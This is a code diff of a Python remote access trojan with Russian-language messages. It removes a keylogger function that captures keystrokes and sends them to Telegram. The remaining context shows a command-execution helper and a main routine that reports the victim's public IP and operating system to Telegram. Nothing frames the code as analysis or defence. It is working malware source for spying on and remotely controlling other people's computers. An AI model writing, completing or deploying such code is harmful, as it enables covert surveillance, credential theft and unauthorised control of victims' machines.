@@ -33,20 +33,6 @@ def execute_cmd(cmd):
     except:
         return "Ошибка"
 
-def keylogger():
-    logs = ""
-    def on_press(key):
-        nonlocal logs
-        try:
-            logs += key.char
-        except:
-            logs += f"[{key}]"
-        if len(logs) > 50:
-            send_tg(f"⌨️ Кейлог: {logs}")
-            logs = ""
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
-
 def main():
     ip = requests.get("https://api.ipify.org").text
     send_tg(f"🖥️ RAT запущен!\nIP: {ip}\nСистема: {platform.system()} {platform.release()}")
